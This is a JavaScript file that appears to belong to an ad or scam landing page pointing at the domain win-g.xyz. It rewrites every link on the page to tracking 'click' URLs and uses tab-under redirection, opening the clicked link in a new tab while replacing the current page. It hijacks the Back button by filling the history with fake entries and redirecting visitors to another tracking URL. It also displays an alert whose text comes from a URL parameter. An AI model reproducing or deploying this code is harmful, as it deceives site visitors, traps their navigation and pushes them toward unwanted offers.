var urlParams = new URLSearchParams(window.location.search);
var click_url = "https://win-g.xyz/click?lp=1"
var click_url_yes = click_url + (click_url.includes('?') ? '&' : '?') +"to_offer=1"
var click_url_no = click_url + (click_url.includes('?') ? '&' : '?') +"to_offer=2"

var back = 'https://win-g.xyz/click?key=185073073f8cd42a2963&source=bbr_2&'+urlParams.toString()
var under = click_url

var cta = 'mainButton';

var aElements = document.getElementsByTagName('a');
console.log(aElements)
var href = click_url + (click_url.includes('?') ? '&' : '?') + urlParams.toString();
console.log(href)

for (var i = 0; i < aElements.length; i++) {
    var aElement = aElements[i];
    if(aElement.classList.contains("no")){
        aElement.setAttribute('href', click_url_no);
    }else {
        aElement.setAttribute('href', click_url_yes);
    }
}


if(typeof under!=="undefined"&&under!==null){if(typeof cta!=="undefined"&&cta!==null){document.addEventListener('click',function(event){var target=event.target;while(target){if(target.tagName==='A'&&target.classList.contains(cta)){const linkHref=target.href;event.preventDefault();window.open(linkHref,'_blank');window.location.replace(under);break;}
target=target.parentNode;}});}else{document.addEventListener('click',function(event){var target=event.target;while(target){if(target.tagName==='A'){const linkHref=target.href;event.preventDefault();window.open(linkHref,'_blank');window.location.replace(under);break;}
target=target.parentNode;}});}}
if(typeof back!=="undefined"&&back!==null){!(function(){var t;try{const URL=window.location.href.split(/[#]/)[0];for(t=0;10>t;++t)history.pushState({},'',URL+'#');onpopstate=function(event){event.state&&location.replace(back);};}catch(o){console.log(o);}})();}
function getURLParameter_location(e){return decodeURI((RegExp(e+"=(.+?)(&|$)").exec(location.search)||[,null])[1]||"")}function getURLParameter_hash(e){return decodeURI((RegExp(e+"=(.+?)(&|$)").exec(location.hash)||[,null])[1]||"")}function getURLParameter(e){var a=null;return getURLParameter_hash(e)?getURLParameter_hash(e):getURLParameter_location(e)} if( getURLParameter('alert') ){ setTimeout( function(){ alert( getURLParameter('alert') ) }, 500 ); }